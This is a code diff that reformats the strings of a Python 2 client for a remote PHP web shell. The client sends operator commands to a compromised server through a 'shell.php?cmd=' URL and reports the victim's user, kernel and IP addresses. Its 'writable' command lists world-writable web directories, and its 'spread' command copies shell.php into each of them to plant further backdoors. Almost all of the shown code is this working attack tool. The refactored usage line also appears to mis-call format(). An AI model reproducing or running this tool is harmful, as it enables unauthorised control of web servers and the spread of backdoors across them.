@@ -41,7 +41,7 @@ class Commander(object):
     # defining static methods
     @staticmethod
     def banner():
-        return """%s
+        return """{0}
 \t\t __         ______   ______   .___  ___. .___  ___.      ___      .__   __.  _______
 \t\t|  |       /      | /  __  \  |   \/   | |   \/   |     /   \     |  \ |  | |       \\
 \t\t|  |      |  ,----'|  |  |  | |  \  /  | |  \  /  |    /  ^  \    |   \|  | |  .--.  |
@@ -49,7 +49,7 @@ class Commander(object):
 \t\t|  |      |  `----.|  `--'  | |  |  |  | |  |  |  |  /  _____  \  |  |\   | |  '--'  |
 \t\t|__|       \______| \______/  |__|  |__| |__|  |__| /__/     \__\ |__| \__| |_______/
 \t\t--------------------------------------------------------------------------------------
-        %s""" % (Colors.YELLOW, Colors.END)
+        {1}""" .format(Colors.YELLOW, Colors.END)
 
     def ServerInfo(self):
         try:
@@ -65,33 +65,26 @@ class Commander(object):
         available_commands = ['exit', 'clear', 'history', 'info', 'banner', 'writable', 'spread']
         self.info = \
         '''
-        %s
-        %sUser%s     :  %s%s%s
-        %sID%s       :  %s%s%s
-        %sKernel%s   :  %s%s%s
-        %sCWD%s      :  %s%s%s
-        %sHost IPs%s :  %s%s%s
-        %sLocal IP%s :  %s%s%s
-        %s
+        {dashed}
+        {red}User{end}     :  {green}{current_user}{end}
+        {red}ID{end}       :  {green}{current_id}{end}
+        {red}Kernel{end}   :  {green}{kernel_info}{end}
+        {red}CWD{end}      :  {green}{cwd}{end}
+        {red}Host IPs{end} :  {green}{host_ip}{end}
+        {red}Local IP{end} :  {green}{local_ip}{end}
+        {dashed}
 
-        %s[+] Available commands: %s.%s
-        %s[+] Inserting%s %s!%s %sat the begining of the command will execute it on your box.%s
-        ''' % ('-'* int(len(source[2])+12),
-                Colors.RED, Colors.END,
-                Colors.GREEN, source[0], Colors.END,    # current user
-                Colors.RED, Colors.END,
-                Colors.GREEN, source[1], Colors.END,    # current ID
-                Colors.RED, Colors.END,
-                Colors.GREEN, source[2], Colors.END,    # kernel version
-                Colors.RED, Colors.END,
-                Colors.GREEN, source[3], Colors.END,    # CWD
-                Colors.RED, Colors.END,
-                Colors.GREEN, ', '.join(source[4:]), Colors.END,    # host ip
-                Colors.RED, Colors.END,
-                Colors.GREEN, local_ip, Colors.END,                 # local ip
-                '-'* int(len(source[2])+12),
-                Colors.HOT, available_commands, Colors.END,         # available commands
-                Colors.HOT, Colors.END, Colors.RED, Colors.END, Colors.HOT, Colors.END, # hint
+        {hot}[+] Available commands: {available_commands}.{end}
+        {hot}[+] Inserting{end} {red}!{end} {hot}at the begining of the command will execute it on your box.{end}
+        '''.format(dashed='-'* int(len(source[2])+12),
+                red=Colors.RED, green=Colors.GREEN, end=Colors.END, hot=Colors.HOT,
+                current_user=source[0],
+                current_id=source[1],
+                kernel_info=source[2],
+                cwd=source[3],
+                host_ip=', '.join(source[4:]),
+                local_ip=local_ip,
+                available_commands=available_commands,
                 )
         print self.info
 
@@ -101,12 +94,12 @@ class Commander(object):
         while True:
             try:
                 try:
-                    command = quote(raw_input('%s%s@%s%s%s%s:~%s(%s)%s-$ ' % (self.source[0],
-                        Colors.RED, Colors.END,
-                        Colors.GREEN, self.source[4], Colors.END,
-                        Colors.YELLOW, self.source[3], Colors.END)))
+                    command = quote(raw_input('{user}{red}@{end}{green}{host_ip}{end}:~{yellow}({cwd}){end}-$ '.format(user=self.source[0],
+                        red=Colors.RED, green=Colors.GREEN, yellow=Colors.YELLOW, end=Colors.END,
+                        host_ip=self.source[4],
+                        cwd=self.source[3])))
                 except IndexError:
-                    command = quote(raw_input('icommand\033[91m@\033[0m\033[92mserver:$ '))
+                    command = quote(raw_input('icommand@server:$ '))
                 history.append(unquote(command))
                 if command not in ['exit', 'quite', 'bye']:
                     if command == 'clear':
@@ -114,7 +107,7 @@ class Commander(object):
                     elif command == 'history':
                         x = 1
                         for command in history:
-                            print '%2d %s' % (x, command)
+                            print '{0:2d} {1}'.format(x, command)
                             x += 1
                     elif command.startswith('!'):
                         Popen(quote(command)[1:], shell=True).wait()
@@ -124,32 +117,32 @@ class Commander(object):
                         print Commander.banner()
                     elif command == 'writable':
                         self.cmd = quote("find /var/www/ -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print")
-                        self.writeables = writeables = map(str.strip, urlopen('%s%s' % (self.url, self.cmd)).readlines())
+                        self.writeables = writeables = map(str.strip, urlopen('{}{}'.format(self.url, self.cmd)).readlines())
                         c = 1
                         for path in writeables:
-                            print '%2d- %s' % (c, path)
+                            print '{0:2d}- {1}'.format(c, path)
                             c += 1
                     elif command == 'spread':
                         self.cmd = quote('find /var/www -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp shell.php')
-                        urlopen('%s%s' % (self.url, self.cmd))
-                        print '[+] Successfully wrote shell.php to %d directory\n[+] Type writeable to check dirs' % len(self.writeables)
+                        urlopen('{}{}'.format(self.url, self.cmd))
+                        print '[+] Successfully wrote shell.php to {} directory\n[+] Type writeable to check dirs'.format(len(self.writeables))
                     else:
-                        source = urlopen('%s%s' % (self.url, command)).read()
+                        source = urlopen('{}{}'.format(self.url, command)).read()
                         if source:
                             print source.rstrip()
                         else:
-                            print '%s: command not found' % quote(command)
+                            print '{}: command not found'.format(unquote(command))
                 else:
-                    print '\n\n[+] Preformed %d commands on the server.\n[!] Connection closed ..' % i
+                    print '\n\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
                     exit(1)
             except KeyboardInterrupt:
-                print '\n\n[+] Preformed %d commands on the server.\n[!] Connection closed ..' % i
+                print '\n\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
                 exit(1)
             i += 1
 
 def main():
     if len(argv) != 2:
-        print '\n[+] Usage : %s Shell_URL\n[!] Example: %s http://www.test.com/shell.php?cmd=' % ((argv[0], )*2)
+        print '\n[+] Usage : {0} Shell_URL\n[!] Example: {1} http://www.test.com/shell.php?cmd='.format((argv[0], )*2)
         exit(1)
 
     else:
